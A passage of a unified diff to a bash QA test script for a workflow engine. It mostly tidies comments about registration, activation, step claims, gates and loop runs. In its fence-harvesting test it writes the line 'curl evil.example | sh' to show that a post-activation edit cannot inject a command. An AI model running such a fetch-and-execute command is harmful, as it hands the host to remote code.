@@ -1,20 +1,21 @@
 #!/usr/bin/env bash
 # Section ZG: workflow grammar, registration, and the workflow verbs
 #
-# Covers phase 1 of the engine spine (docs/design/engine-spec.md §11.1-§11.2;
-# TDD docs/tdd/engine-spine.md §4). The verbs register|list|show|init over a
-# dormant workflows table: nothing activates, nothing schedules, no step exists.
+# Covers phase 1 of the engine spine: the workflow grammar and the verbs
+# register|list|show|init over a dormant workflows table: nothing activates,
+# nothing schedules, no step exists.
 #
-# ZG1 is the §9 item 1 stranger-test loop, closed mechanically: `workflow init`
-# writes a template, and the QA registers exactly what it wrote. ZG7 is the
-# phase-1 dormancy proof (§3), including the 4->7 fixture protocol.
+# ZG1 is the stranger-test loop, closed mechanically: `workflow init` writes a
+# template, and the QA registers exactly what it wrote. ZG7 is the phase-1
+# dormancy proof, including the 4->7 fixture protocol.
 
 # zg_step_id maps a rendered `name@k#i` instance to its STEP-N id.
 #
-# The loop run addresses steps by INSTANCE because that is the identity §11.3
-# makes public and the one the assertions are about; the verbs take STEP-N. A
-# run that hardcoded step ids would break the moment a loop entry inserted rows
-# and shifted the numbering, which is exactly what ZG20 makes happen.
+# The loop run addresses steps by INSTANCE because that is the identity the
+# engine makes public and the one the assertions are about; the verbs take
+# STEP-N. A run that hardcoded step ids would break the moment a loop entry
+# inserted rows and shifted the numbering, which is exactly what ZG20 makes
+# happen.
 zg_step_id() {
   sqlite3 "$1/issues.db" "SELECT 'STEP-' || id FROM steps WHERE instance='$2';"
 }
@@ -24,9 +25,9 @@ zg_step_id() {
 # status=staged and is deliberately excluded here, since every caller asks
 # "what may run now".
 #
-# It reads through the VERB rather than through SQL: readiness is computed
-# (§6.2), so a SQL query for `status='ready'` would find nothing and quietly
-# pass every assertion built on it.
+# It reads through the VERB rather than through SQL: readiness is computed, so
+# a SQL query for `status='ready'` would find nothing and quietly pass every
+# assertion built on it.
 zg_ready_instances() {
   run_env "$1" next --run RUN-1 --json >/dev/null 2>&1
   printf '%s' "$CMD_STDOUT" |
@@ -38,17 +39,16 @@ zg_ready_instances() {
 # verbs and the real token transport.
 #
 # Every step of the loop run goes through this: claim (which mints the token),
-# then `complete` with the token in DOCKET_TOKEN — never in argv (§4). The
+# then `complete` with the token in DOCKET_TOKEN — never in argv. The
 # payload argument is optional and is what drives `verify`'s threshold.
 # zg_trust_fixture_gates approves every gate the committed fixture declares, so
 # a section whose subject is NOT the trust model can drive a run to `done`.
 #
 # Gates became real at stage 4: with an empty allowlist every one is correctly
-# `unmatched`, which fails its step and parks the run `waiting-human`
-# (gates-trust §6.2 N3). That is the engine behaving correctly, and the sections
-# that assert liveness (ZG16's killed claimer, §9 item 4) or supersession
-# (ZG20's highest-ordinal completion) would otherwise be measuring the trust
-# model instead of their own subject.
+# `unmatched`, which fails its step and parks the run `waiting-human`. That is
+# the engine behaving correctly, and the sections that assert liveness (ZG16's
+# killed claimer) or supersession (ZG20's highest-ordinal completion) would
+# otherwise be measuring the trust model instead of their own subject.
 #
 # `/usr/bin/true` is deliberately the most boring possible command: these
 # sections care only that the gate PASSES. ZG13 is where a witness command
@@ -90,15 +90,15 @@ zg_complete_step() {
 test_zg_workflow() {
   printf "Section ZG: Workflows — grammar, registration, and verbs"
 
-  local FIXTURE="$SCRIPT_DIR/../docs/design/example-workflow.toml"
+  local FIXTURE="$SCRIPT_DIR/../internal/workflow/testdata/example-workflow.toml"
   # The schema the committed fixture DECLARES. `reconcile` is an
-  # `action = "aggregate"` step, and V29 requires such a step to name a schema
+  # `action = "aggregate"` step, and such a step must name a schema
   # that declares `params.field` as an `ordered_enum` — median is defined only
   # over an order. So every repo below registers the schema BEFORE the workflow,
-  # which is also the ordering §4.6 pins for S6's auto-registration.
+  # which is also the ordering config-directory auto-registration uses.
   #
   # It lives in scripts/qa/fixtures/, which the genericity gate does not scan,
-  # because it is INSTANCE DATA BY LOCATION (§1.1.1).
+  # because it is INSTANCE DATA BY LOCATION.
   local ZG_SCHEMA="$SCRIPT_DIR/qa/fixtures/schemas/findings@1.json"
   local ZG_TMP
   ZG_TMP=$(qa_mktemp_d)
@@ -117,7 +117,7 @@ test_zg_workflow() {
   fi
   check "ZG" "ZG0_fixture_exists" "PASS"
 
-  # Schemas before workflows (§4.6). This one registration serves every later
+  # Schemas before workflows. This one registration serves every later
   # `run`-based check in this section, which all share the suite's database.
   run schema register findings@1 "$ZG_SCHEMA" --json
   assert_exit "ZG" "ZG0_schema_register" 0
@@ -145,7 +145,7 @@ test_zg_workflow() {
       "fanout=$FANOUT loop=$LOOPY human=$HUMAN, want >=1 of each"
   fi
 
-  # The A4 amendment applied to the fixture: its human step declares
+  # The amendment applied to the fixture: its human step declares
   # on_fail explicitly and does not route rejects to waiting-human.
   local GATE_ONFAIL
   GATE_ONFAIL=$(echo "$CMD_STDOUT" | jq -r \
@@ -153,7 +153,7 @@ test_zg_workflow() {
   check_cond "ZG" "ZG0_human_on_fail" "human step on_fail = '$GATE_ONFAIL', want fix-loop" [ "$GATE_ONFAIL" = "fix-loop" ]
 
   # ---------------------------------------------------------------------------
-  # ZG1: the stranger test, closed mechanically (§9 item 1).
+  # ZG1: the stranger test, closed mechanically.
   #
   # `workflow init` writes a template; the QA registers exactly what it wrote.
   # A shipped template that fails its own validator is the worst possible first
@@ -202,7 +202,8 @@ test_zg_workflow() {
   assert_json "ZG" "ZG1_parallel_name" ".data.name" "parallel-check"
 
   # ---------------------------------------------------------------------------
-  # ZG2: the §4.5 refusal matrix, by exit code AND by machine-readable code.
+  # ZG2: the registration refusal matrix, by exit code AND by machine-readable
+  # code.
   # ---------------------------------------------------------------------------
 
   # Grammar/validation failure -> VALIDATION_ERROR (3). A type="human" step
@@ -421,7 +422,7 @@ TOML
   assert_json "ZG" "ZG6_v2_row_version" ".data.row_version" "1"
 
   # ---------------------------------------------------------------------------
-  # ZG7: phase-1 dormancy (§3).
+  # ZG7: phase-1 dormancy.
   #
   # A repo with zero rows in `workflows` behaves byte-identically to v6 on
   # every pre-existing verb. The full sweep lives in scripts/compat-sweep.sh
@@ -473,7 +474,7 @@ TOML
   rm -rf "$ZG_CLEAN"
 
   # ---------------------------------------------------------------------------
-  # ZG8: the §9 item 8 fixture protocol, 4 -> 7 in ONE pass.
+  # ZG8: the fixture protocol, 4 -> 7 in ONE pass.
   #
   # The v7 structures are asserted present BEFORE the golden diff is trusted:
   # a diff against a database that failed to migrate passes vacuously and would
@@ -549,7 +550,7 @@ TOML
   check_cond "ZG" "ZG8_activation_tables" "missing after 4->7:$FX_MISSING" [ -z "$FX_MISSING" ]
 
   # `issues.scope_globs` is the ONE touch v7 makes to an existing table, and
-  # it must be NULL on every row a v4 database brought with it (§3 phase-2
+  # it must be NULL on every row a v4 database brought with it (phase-2
   # dormancy). A default of '[]' would make every legacy issue read as "scope
   # declared, empty", which is a different fact from "no scope declared".
   local FX_SCOPED
@@ -595,14 +596,14 @@ SQL
   check_cond "ZG" "ZG8_rewind_guard" "the rewind guard did not restore:$REWIND_MISSING" [ -z "$REWIND_MISSING" ]
 
   # ---------------------------------------------------------------------------
-  # ZG9: activation against a real issue graph (§5.3).
+  # ZG9: activation against a real issue graph.
   #
   # The Go tests drive the fat transaction in-process; this proves the whole
   # path — CLI, envelope, exit code, and the rows that land — actually works
   # against a database an operator built with the ordinary issue verbs.
   #
   # NOTE ON GATES: nothing in this section executes a gate. At this stage the
-  # gate runner is a specified PASS-THROUGH (TDD §5.6): it returns
+  # gate runner is a specified PASS-THROUGH: it returns
   # {verdict: "pass", exit: 0, stub: true} without touching the process table.
   # A green run here is NOT gate coverage, and the `stub: true` flag exists
   # precisely so an operator can tell the difference. Gate execution lands at
@@ -660,7 +661,7 @@ SQL
   NOT_PENDING=$(sqlite3 "$ZG_DB" "SELECT COUNT(*) FROM steps WHERE status != 'pending';")
   check_cond "ZG" "ZG9_all_pending" "$NOT_PENDING steps are not pending at expansion" [ "$NOT_PENDING" = "0" ]
 
-  # The step kinds carry the §11.1 alternative each step declared, which is
+  # The step kinds carry the alternative each step declared, which is
   # what phase 3's `claim` reads to refuse a human gate.
   local GATE_KIND ACTION_KIND
   GATE_KIND=$(sqlite3 "$ZG_DB" \
@@ -673,7 +674,7 @@ SQL
     check "ZG" "ZG9_step_kinds" "FAIL" "commit-gate=$GATE_KIND reconcile=$ACTION_KIND"
   fi
 
-  # The loop step is absent at ordinal 0 (§11.3 (3)).
+  # The loop step is absent at ordinal 0.
   local NLOOP
   NLOOP=$(sqlite3 "$ZG_DB" "SELECT COUNT(*) FROM steps WHERE step_name='fix';")
   check_cond "ZG" "ZG9_loop_step_absent" "$NLOOP \`fix\` instances at ordinal 0" [ "$NLOOP" = "0" ]
@@ -703,7 +704,7 @@ SQL
   assert_json "ZG" "ZG9_promoted" ".data.status" "todo"
 
   # The snapshot froze `scope`, and the scheduler's live column still carries
-  # it too — §5.1.1's two-different-answers rule, both halves present.
+  # it too — the two-different-answers rule, both halves present.
   local SNAP_SCOPE LIVE_SCOPE
   SNAP_SCOPE=$(sqlite3 "$ZG_DB" \
     "SELECT json_extract(issue_snapshot, '\$.scope[0]') FROM run_issues WHERE issue_id=1;")
@@ -734,7 +735,7 @@ SQL
     "SELECT group_concat(id||status||row_version||updated_at_ms) FROM runs;")
   check_cond "ZG" "ZG9_status_writes_nothing" "`run status` mutated the run row" [ "$RUN_STATE_BEFORE" = "$RUN_STATE_AFTER" ]
 
-  # Mid-run edit immunity (§9 item 5) at the CLI: edit the body and the title,
+  # Mid-run edit immunity at the CLI: edit the body and the title,
   # and the activation-time snapshot is unmoved.
   run_env "$ZG_RUN" issue edit DKT-1 -t "EDITED title" -d "EDITED body" --json
   assert_exit "ZG" "ZG9_edit" 0
@@ -749,7 +750,7 @@ SQL
   fi
 
   # ---------------------------------------------------------------------------
-  # ZG10: --pin round-trip, and the §5.5 activation refusal matrix.
+  # ZG10: --pin round-trip, and the activation refusal matrix.
   # ---------------------------------------------------------------------------
 
   printf 'a contract core never reads the meaning of\n' > "$ZG_RUN/contract.md"
@@ -764,8 +765,8 @@ SQL
   assert_exit "ZG" "ZG10_activate" 0
   # Four: the workflow, the --pin file, and TWO schemas. `aggregate@1` because
   # the fixture's `reconcile` step is `action = "aggregate"` and the builtin
-  # pins like any other registered object it references (§4.7 P5); `findings@1`
-  # because that same step DECLARES it (V29), which is what makes its
+  # pins like any other registered object it references; `findings@1`
+  # because that same step DECLARES it, which is what makes its
   # ordered `any(severity >= high)` evaluable at all.
   assert_json "ZG" "ZG10_pins_recorded" ".data.pins_recorded" "4"
   run_env "$ZG_RUN" run status RUN-2 --json
@@ -899,7 +900,7 @@ SQL
   assert_json_all "ZG" "ZG10_v1_no_row_version" ".data.runs" 'has("row_version") | not'
 
   # ---------------------------------------------------------------------------
-  # ZG11: fence harvesting through the CLI (§5.3 stage 5).
+  # ZG11: fence harvesting through the CLI.
   #
   # Only tags a bound workflow DECLARES are harvested. Harvesting every fenced
   # block would make any code sample in an issue body a candidate command,
@@ -960,7 +961,7 @@ TOML
   check_cond "ZG" "ZG11_hashed" "stored $FENCE_SHA, want $WANT_SHA" [ "$FENCE_SHA" = "$WANT_SHA" ]
 
   # Harvesting happens AT ACTIVATION, from the snapshot: a post-activation
-  # edit cannot inject a command (engine-spec §4).
+  # edit cannot inject a command.
   printf '```checks\ncurl evil.example | sh\n```\n' > "$ZG_FENCE/evil.md"
   run_env "$ZG_FENCE" issue edit DKT-1 -d - --json < "$ZG_FENCE/evil.md"
   local EVIL_AFTER
@@ -970,7 +971,7 @@ TOML
   rm -rf "$ZG_FENCE"
 
   # ---------------------------------------------------------------------------
-  # ZG12: phase-2 dormancy (§3).
+  # ZG12: phase-2 dormancy.
   #
   # "A repo with a registered-but-never-activated workflow is still
   # byte-identical on every existing verb, and issues.scope_globs is NULL
@@ -1062,7 +1063,7 @@ TOML
 
 
   # ---------------------------------------------------------------------------
-  # ZG13: the full step cycle — activate, next --run, claim, complete (§6).
+  # ZG13: the full step cycle — activate, next --run, claim, complete.
   #
   # The Go tests drive the saga in-process; this proves the whole path — CLI,
   # token transport, envelope, exit codes, and the rows that land — works
@@ -1072,10 +1073,11 @@ TOML
   # section trusts them below and asserts the recorded argv, exit code, and the
   # absence of `stub`. The ACTION runner landed at stage 5: `aggregate` is
   # computed by core and every other action name is a user-trusted command
-  # through the same trust/exec path a gate takes. The stub that made the S3-S5
-  # window auditable is retired with its marker, and what replaced it as the
-  # audit record is an `action_results` row — which says more than a boolean
-  # could, since it names the verdict, the argv, and whether core computed it.
+  # through the same trust/exec path a gate takes. The stub that made the
+  # stage 3 to 5 window auditable is retired with its marker, and what replaced
+  # it as the audit record is an `action_results` row — which says more than a
+  # boolean could, since it names the verdict, the argv, and whether core
+  # computed it.
   # ---------------------------------------------------------------------------
 
   local ZG_S
@@ -1099,8 +1101,9 @@ TOML
   # sentinel file, so "the gate ran" is proven by the filesystem rather than by
   # a row the engine wrote about itself.
   #
-  # SB5 first: this is the first section to touch the trust store, and running
-  # it against the operator's real one would write entries into their config.
+  # Assert the sandbox first: this is the first section to touch the trust
+  # store, and running it against the operator's real one would write entries
+  # into their config.
   assert_trust_sandbox
   local ZG_WITNESS="$ZG_S/witness"
   mkdir -p "$ZG_WITNESS"
@@ -1119,27 +1122,27 @@ TOML
   assert_json "ZG" "ZG13_next_one" \
     '[.data.steps[] | select(.status=="ready")] | length' "1"
   assert_json "ZG" "ZG13_next_instance" '.data.steps[0].instance' "implement@0"
-  # `ready` is COMPUTED (§6.2) — the stored column says `pending`.
+  # `ready` is COMPUTED — the stored column says `pending`.
   assert_json "ZG" "ZG13_next_ready" '.data.steps[0].status' "ready"
   local ZG_STORED
   ZG_STORED=$(sqlite3 "$ZG_S/issues.db" \
     "SELECT status FROM steps WHERE instance='implement@0';")
   check_cond "ZG" "ZG13_ready_not_persisted" "stored status is $ZG_STORED; \`ready\` must never be persisted" [ "$ZG_STORED" = "pending" ]
 
-  # The §11.4 next-row shape, field for field.
+  # The next-row shape, field for field.
   local ZG_KEY
   for ZG_KEY in step instance issue run kind executor class attempt \
                 expected_cost lease_ttl_s status; do
     assert_json_exists "ZG" "ZG13_row_$ZG_KEY" ".data.steps[0].$ZG_KEY"
   done
 
-  # Claim: token AND the full context bundle in ONE response (§6.6).
+  # Claim: token AND the full context bundle in ONE response.
   run_env "$ZG_S" step claim STEP-1 --owner zg-worker --json
   assert_exit "ZG" "ZG13_claim" 0
   assert_json_exists "ZG" "ZG13_claim_token" ".data.token"
   assert_json_exists "ZG" "ZG13_claim_context" ".data.context"
-  # The subject key is `step`, verbatim per §11.4 — which is what closes
-  # the recorded deviation (§6.4.1).
+  # The subject key is `step`, verbatim per the wire shape — which is what
+  # closes the recorded deviation.
   assert_json "ZG" "ZG13_claim_subject" ".data.step" "STEP-1"
   # The bundle reads the SNAPSHOT, never the live issue.
   assert_json "ZG" "ZG13_ctx_body" ".data.context.issue.body_snapshot" "the request body"
@@ -1148,14 +1151,14 @@ TOML
   local ZG_TOKEN
   ZG_TOKEN=$(printf '%s' "$CMD_STDOUT" | jq -r '.data.token')
 
-  # `step context` re-emits the bundle READ-ONLY, no token required (§11.4).
+  # `step context` re-emits the bundle READ-ONLY, no token required.
   run_env "$ZG_S" step context STEP-1 --json
   assert_exit "ZG" "ZG13_context_no_token" 0
   assert_json "ZG" "ZG13_context_body" \
     ".data.context.issue.body_snapshot" "the request body"
 
   # --meta rides as a SIBLING object, so asking for it does not change the
-  # bundle the goldens compare (§6.4).
+  # bundle the goldens compare.
   run_env "$ZG_S" step context STEP-1 --meta --json
   assert_exit "ZG" "ZG13_meta" 0
   assert_json_exists "ZG" "ZG13_meta_sibling" ".data.meta.total_bytes"
@@ -1188,7 +1191,7 @@ TOML
     check "ZG" "ZG13_saga_complete" "FAIL" "status|routing|saga = $ZG_DONE"
   fi
 
-  # The token RETIRED when the artifact recorded (§6.8's hinge).
+  # The token RETIRED when the artifact recorded.
   local ZG_LEASE
   ZG_LEASE=$(sqlite3 "$ZG_S/issues.db" \
     "SELECT COUNT(*) FROM steps WHERE instance='implement@0' AND owner IS NULL;")
@@ -1211,7 +1214,7 @@ TOML
       "$ZG_GATES gate results, $ZG_STUBS marked stub (want 5 results, 0 stubs)"
   fi
 
-  # A real argv and a real exit code on every one — T11's forgery check, as an
+  # A real argv and a real exit code on every one — the forgery check, as an
   # assertion rather than a promise. `argv` is NULL and `exit` is NULL only on
   # an unmatched gate, and none of these is unmatched.
   ZG_PASSED=$(sqlite3 "$ZG_S/issues.db" \
@@ -1227,7 +1230,7 @@ TOML
   ZG_SENTINELS=$(find "$ZG_WITNESS" -type f 2>/dev/null | wc -l | tr -d ' ')
   check_cond "ZG" "ZG13_gates_actually_executed" "$ZG_SENTINELS witness sentinels exist (want 5) — gates did not execute" [ "$ZG_SENTINELS" = "5" ]
 
-  # `stub` is ABSENT from the JSON, not merely false (§4.2's omitempty).
+  # `stub` is ABSENT from the JSON, not merely false (omitempty).
   if sqlite3 "$ZG_S/issues.db" \
        "SELECT COUNT(*) FROM gate_results WHERE stub = 1;" | grep -q '^0$'; then
     check "ZG" "ZG13_no_stub_rows" "PASS"
@@ -1242,8 +1245,8 @@ TOML
   assert_json "ZG" "ZG13_fanout_first" '.data.steps[0].instance' "review@0#0"
 
   # ---------------------------------------------------------------------------
-  # ZG14: the §6.9 refusal matrix, by EXIT CODE and by .code — each followed by
-  # a version-unchanged assertion, because A REFUSAL NEVER WRITES.
+  # ZG14: the completion refusal matrix, by EXIT CODE and by .code — each
+  # followed by a version-unchanged assertion, because A REFUSAL NEVER WRITES.
   # ---------------------------------------------------------------------------
 
   local ZG_V_BEFORE ZG_V_AFTER
@@ -1451,12 +1454,12 @@ TOML
   rm -rf "$ZG_RACE_OUT"
 
   # ---------------------------------------------------------------------------
-  # ZG16: §9 item 4 IN FULL — kill a claimer mid-step; expiry ALONE re-readies
+  # ZG16: LIVENESS IN FULL — kill a claimer mid-step; expiry ALONE re-readies
   # it; a second worker completes it; THE RUN REACHES `done`; the attempt trail
   # is complete.
   #
-  # The S2 QA proved the issue-level half. This is the whole of it at step
-  # level, including the part S2 could not prove: that the run finishes.
+  # The stage 2 QA proved the issue-level half. This is the whole of it at step
+  # level, including the part stage 2 could not prove: that the run finishes.
   # ---------------------------------------------------------------------------
 
   local ZG_K
@@ -1533,15 +1536,15 @@ TOML
   local ZG_K_TOKEN2
   ZG_K_TOKEN2=$(printf '%s' "$CMD_STDOUT" | jq -r '.data.token')
   # (e) The attempt trail records BOTH claims. `attempt` surfaces under v2
-  # only — v1's claim shape is §11.4's four fields and nothing else.
+  # only — v1's claim shape is its four fields and nothing else.
   assert_json "ZG" "ZG16_attempt_trail" ".data.attempt" "2"
 
   DOCKET_TOKEN="$ZG_K_TOKEN2" run_env "$ZG_K" step complete STEP-1 \
     --artifact-file "$ZG_TMP/artifact.txt" --json
   assert_exit "ZG" "ZG16_second_complete" 0
 
-  # (d) THE RUN REACHES `done` — the part S2 could not prove. Drive the rest of
-  # the pipeline; every step completes through the ordinary verbs.
+  # (d) THE RUN REACHES `done` — the part stage 2 could not prove. Drive the
+  # rest of the pipeline; every step completes through the ordinary verbs.
   local ZG_SID ZG_ST ZG_KIND ZG_TOK ZG_ROUNDS=0
   while [ "$ZG_ROUNDS" -lt 20 ]; do
     ZG_ROUNDS=$((ZG_ROUNDS + 1))
@@ -1569,7 +1572,7 @@ TOML
 
   local ZG_K_RUN
   ZG_K_RUN=$(sqlite3 "$ZG_K/issues.db" "SELECT status FROM runs WHERE id=1;")
-  check_cond "ZG" "ZG16_run_done" "the run is $ZG_K_RUN after a killed claimer; §9 item 4 requires it to finish" [ "$ZG_K_RUN" = "done" ]
+  check_cond "ZG" "ZG16_run_done" "the run is $ZG_K_RUN after a killed claimer; it must finish" [ "$ZG_K_RUN" = "done" ]
 
   # The attempt trail survived to the end: the dead claim is still counted.
   local ZG_K_ATT
@@ -1578,7 +1581,7 @@ TOML
   check_cond "ZG" "ZG16_trail_complete" "attempt = $ZG_K_ATT; the killed claim must remain in the trail" [ "$ZG_K_ATT" = "2" ]
 
   # ---------------------------------------------------------------------------
-  # ZG17: `guard stop` and `guard gate` — exit 0 allow / exit 2 deny (§6.12).
+  # ZG17: `guard stop` and `guard gate` — exit 0 allow / exit 2 deny.
   # ---------------------------------------------------------------------------
 
   # The finished run allows a stop.
@@ -1645,7 +1648,7 @@ TOML
     "no \`type=\"human\"\` or \`type=\"vote\"\` step"
 
   # ---------------------------------------------------------------------------
-  # ZG18: phase-3 dormancy (§3) — an ACTIVATED run's issues read
+  # ZG18: phase-3 dormancy — an ACTIVATED run's issues read
   # byte-identically under --json=v1 and in human mode.
   #
   # Step and lease data may surface only under --json=v2. This is the phase's
@@ -1696,7 +1699,7 @@ TOML
 
 
   # ---------------------------------------------------------------------------
-  # ZG19: §9 item 5 — determinism, at three levels (§8.3).
+  # ZG19: determinism, at three levels.
   #
   #   1. TOPOLOGY GOLDEN. The same inputs expand to the same step table, byte
   #      for byte, on a fresh database.
@@ -1806,26 +1809,26 @@ TOML
   rm -rf "$ZG_DET" "$ZG_BEFORE_DIR" "$ZG_SENS"
 
   # ===========================================================================
-  # PHASE 4 — loops, joins, and events (TDD §7)
+  # PHASE 4 — loops, joins, and events
   # ===========================================================================
 
   # ---------------------------------------------------------------------------
-  # ZG20: THE FULL LOOP RUN, over the committed fixture (§7.7's 11-step plan).
+  # ZG20: THE FULL LOOP RUN, over the committed fixture (an 11-step plan).
   #
   # The loop is driven at `verify`, NOT at `reconcile`, and the distinction is
-  # the whole reason §7.7 specifies this run step by step. The fixture declares
+  # the whole reason this run is specified step by step. The fixture declares
   # two `fix-loop` thresholds and only one of them can fire at S3:
   #
   #   reconcile  { "fix-loop" = "any(severity >= high)" }   an ORDERED comparison
-  #              over the stub runner's EMPTY payload (§6.13). §6.14 T4
+  #              over the stub runner's EMPTY payload. The engine
   #              short-circuits `any` over zero payloads to FALSE before the
   #              `>=` is attempted, so no match => `pass`. Nothing is guessed
   #              and the ordered comparison is never evaluated.
   #   verify     { "fix-loop" = "any(status == unmet)", ... }   an EQUALITY
-  #              operator, live at S3 per §6.14 T1, over a payload the harness
+  #              operator, live at S3, over a payload the harness
   #              supplies on `step complete --payload-file`.
   #
-  # GATES ARE STUBBED at S3 (§5.6): every gate result rides `stub: true` and no
+  # GATES ARE STUBBED at S3: every gate result rides `stub: true` and no
   # subprocess runs. The loop's control flow is real; the gate verdicts are not.
   # ---------------------------------------------------------------------------
 
@@ -1882,7 +1885,7 @@ TOML
   zg_complete_step "$ZG_L" "review@0#3" "$ZG_TMP/artifact.txt" ""
 
   # Step 3: synthesize@0, then reconcile@0 — an ACTION step, which `next` drives
-  # ENGINE-SIDE (§6.15). It is never claimed; `claim` refuses it.
+  # ENGINE-SIDE. It is never claimed; `claim` refuses it.
   zg_complete_step "$ZG_L" "synthesize@0" "$ZG_TMP/artifact.txt" ""
   run_env "$ZG_L" next --run RUN-1 --json >/dev/null
 
@@ -1895,7 +1898,7 @@ TOML
       WHERE s.instance = 'reconcile@0' AND a.kind = 'findings';")
   check_cond "ZG" "ZG20_action_artifact_kind" "reconcile@0 artifact kind is '$ZG_L_ACT', want params.output = findings" [ "$ZG_L_ACT" -ge 1 ]
 
-  # THE STUB IS RETIRED (§6.3 S1-S4). A real action artifact records its payload
+  # THE STUB IS RETIRED. A real action artifact records its payload
   # as the PLAIN ARRAY and leaves `artifacts.stub` at 0; the wrapper survives
   # only on rows an S3/S4 binary wrote, whose bytes the migration deliberately
   # does not rewrite. What replaced the marker is an `action_results` row.
@@ -1919,16 +1922,16 @@ TOML
       "with NULL argv/exit — a builtin spawns nothing"
   fi
 
-  # Step 4: reconcile@0 routed `pass` — the T4 SHORT-CIRCUIT, asserted directly
-  # so a future change to T4 breaks THIS check rather than making the loop
-  # mysteriously stop looping somewhere downstream.
+  # Step 4: reconcile@0 routed `pass` — the EMPTY-PAYLOAD SHORT-CIRCUIT,
+  # asserted directly so a future change to it breaks THIS check rather than
+  # making the loop mysteriously stop looping somewhere downstream.
   local ZG_L_RECROUTE
   ZG_L_RECROUTE=$(sqlite3 "$ZG_L/issues.db" \
     "SELECT routing FROM steps WHERE instance='reconcile@0';")
-  check_cond "ZG" "ZG20_reconcile_t4_pass" "reconcile@0 routed '$ZG_L_RECROUTE', want pass — T4 short-circuits \`any\` over an empty payload" [ "$ZG_L_RECROUTE" = "pass" ]
+  check_cond "ZG" "ZG20_reconcile_t4_pass" "reconcile@0 routed '$ZG_L_RECROUTE', want pass — \`any\` over an empty payload short-circuits to false" [ "$ZG_L_RECROUTE" = "pass" ]
 
   # Step 5: verify@0 with a crafted `unmet` payload => `any(status == unmet)` is
-  # true by T1 => routing `fix-loop`.
+  # true by live equality => routing `fix-loop`.
   zg_complete_step "$ZG_L" "verify@0" "$ZG_TMP/artifact.txt" "$ZG_TMP/unmet.json"
   local ZG_L_VROUTE
   ZG_L_VROUTE=$(sqlite3 "$ZG_L/issues.db" \
@@ -1948,7 +1951,7 @@ TOML
   check_cond "ZG" "ZG20_loop_entered_event" "$ZG_L_EV loop-entered events, want 1" [ "$ZG_L_EV" = "1" ]
 
   # commit-gate@0 and commit@0 are downstream of `after_loop` and unclaimed:
-  # superseded (§7.3), each event-logged.
+  # superseded, each event-logged.
   local ZG_L_SUP
   ZG_L_SUP=$(sqlite3 "$ZG_L/issues.db" \
     "SELECT GROUP_CONCAT(instance, ',') FROM (
@@ -1966,12 +1969,12 @@ TOML
   check_cond "ZG" "ZG20_superseded_events" "$ZG_L_SUPEV step-superseded events, want 2" [ "$ZG_L_SUPEV" = "2" ]
 
   # `implement@0` is UPSTREAM of after_loop: untouched, still done, and still
-  # addressable — prior instances are immutable (§11.3).
+  # addressable — prior instances are immutable.
   local ZG_L_IMP
   ZG_L_IMP=$(sqlite3 "$ZG_L/issues.db" "SELECT status FROM steps WHERE instance='implement@0';")
   check_cond "ZG" "ZG20_upstream_untouched" "implement@0 = '$ZG_L_IMP'; it is upstream of after_loop and must not be swept" [ "$ZG_L_IMP" = "done" ]
 
-  # fix@1 instantiated (§11.3 (3)), and the after_loop chain with it (§11.3 (4)).
+  # fix@1 instantiated, and the after_loop chain with it.
   local ZG_L_ORD1
   ZG_L_ORD1=$(sqlite3 "$ZG_L/issues.db" \
     "SELECT COUNT(*) FROM steps WHERE ordinal=1 AND instance IN
@@ -1984,7 +1987,7 @@ TOML
   ZG_L_IMP1=$(sqlite3 "$ZG_L/issues.db" "SELECT COUNT(*) FROM steps WHERE instance='implement@1';")
   check_cond "ZG" "ZG20_no_upstream_reinstantiation" "implement@1 exists; upstream steps do not re-instantiate" [ "$ZG_L_IMP1" = "0" ]
 
-  # Step 7: fix@1's inputs bind PER INPUT across ordinals (§7.4) —
+  # Step 7: fix@1's inputs bind PER INPUT across ordinals —
   # `reconcile.findings` at ordinal 0 (nothing has re-run it at ordinal 1) and
   # `implement.change-summary` at ordinal 0. Asserted by PRODUCER INSTANCE,
   # which is the artifact's identity on the wire.
@@ -2019,7 +2022,7 @@ TOML
   ZG_L_V1=$(sqlite3 "$ZG_L/issues.db" "SELECT routing FROM steps WHERE instance='verify@1';")
   check_cond "ZG" "ZG20_verify1_passes" "verify@1 routed '$ZG_L_V1' on a met payload, want pass" [ "$ZG_L_V1" = "pass" ]
 
-  # Step 10: commit-gate@1 is `type="human"` — `claim` refuses it (§6.15), and
+  # Step 10: commit-gate@1 is `type="human"` — `claim` refuses it, and
   # `step approve` moves it to done.
   local ZG_L_GATE
   ZG_L_GATE=$(zg_step_id "$ZG_L" 'commit-gate@1')
@@ -2054,7 +2057,7 @@ TOML
   fi
 
   # The superseded ordinal-0 rows are STILL superseded — completion did not
-  # rewrite them. Prior instances remain immutable and addressable (§11.3).
+  # rewrite them. Prior instances remain immutable and addressable.
   local ZG_L_SUP_AFTER
   ZG_L_SUP_AFTER=$(sqlite3 "$ZG_L/issues.db" \
     "SELECT COUNT(*) FROM steps WHERE status='superseded';")
@@ -2071,22 +2074,22 @@ TOML
   assert_exit "ZG" "ZG20_guard_stop_allows" 0
 
   # ---------------------------------------------------------------------------
-  # ZG21: §9 ITEM 2, PARTIAL (§6.16, §7.7).
+  # ZG21: ATTRIBUTION, PARTIAL.
   #
   # "Every transition is attributable to `next`, a gate, a threshold, or human
-  # input." Over ZG20's completed run: every event kind is drawn from §7.6's
+  # input." Over ZG20's completed run: every event kind is drawn from the
   # CLOSED SET, and every step status change has a producing event.
   #
   # STILL PARTIAL, but for ONE remaining reason rather than two:
   #   1. Gates are REAL as of stage 4 — ZG13 above trusts them and proves a
   #      subprocess ran, and the closed set gained `gate-unmatched`/`gate-rerun`
-  #      and `trust-added`/`trust-removed` (gates-trust §6.4). This run's gates
+  #      and `trust-added`/`trust-removed`. This run's gates
   #      are unmatched (it trusts nothing), which is itself an attributable
   #      transition and is why `gate-unmatched` appears below.
-  #   2. ORDERED THRESHOLDS ARE INERT at S3 (§6.14 T3/T4). The `>=` half of
+  #   2. ORDERED THRESHOLDS ARE INERT at S3. The `>=` half of
   #      "attributable to a threshold" is never exercised by this run, because
   #      the only ordered threshold short-circuits to false on an empty payload.
-  # S5 closes that half; this asserts everything that exists now.
+  # Stage 5 closes that half; this asserts everything that exists now.
   # ---------------------------------------------------------------------------
 
   local ZG_L_KINDS ZG_L_UNKNOWN
@@ -2097,7 +2100,7 @@ TOML
     check "ZG" "ZG21_kinds_are_closed" "PASS"
   else
     check "ZG" "ZG21_kinds_are_closed" "FAIL" \
-      "event kinds outside §7.6's closed set: $(printf '%s' "$ZG_L_UNKNOWN" | tr '\n' ' ')"
